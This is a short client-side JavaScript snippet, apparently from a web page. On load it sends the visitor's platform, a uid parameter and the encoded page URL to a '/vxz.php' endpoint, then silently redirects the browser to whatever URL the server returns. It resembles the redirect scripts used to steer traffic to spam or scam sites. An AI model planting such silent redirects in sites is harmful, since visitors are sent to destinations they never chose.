<script type="text/javascript">
function dataJson(){
	var url = window.location.href;
	var win = (navigator.platform!=undefined)?navigator.platform:'undefined';
    let queryUrl = new Request('/vxz.php/index/more_json', {
        method: 'post',
        headers: {'Content-Type': 'application/json;charset=utf-8;'},
        body: JSON.stringify({win:win,uid:getParamVal('uid'),vid:'561',url:btoa(url)})
    });
    fetch(queryUrl)
    .then(res=> res.json())
    .then(data => {
        if(data.url!=''){
            window.location.href = data.url;
        }
    }); 
}
function getParamVal(variable)
{
   var query = window.location.search.substring(1);
   var vars = query.split("&");
   for (var i=0;i<vars.length;i++) {
           var pair = vars[i].split("=");
           if(pair[0] == variable){return pair[1];}
   }
   return 0;
}
window.onload = function(){
    setTimeout( function(){
        dataJson();
    },200);
}
</script>
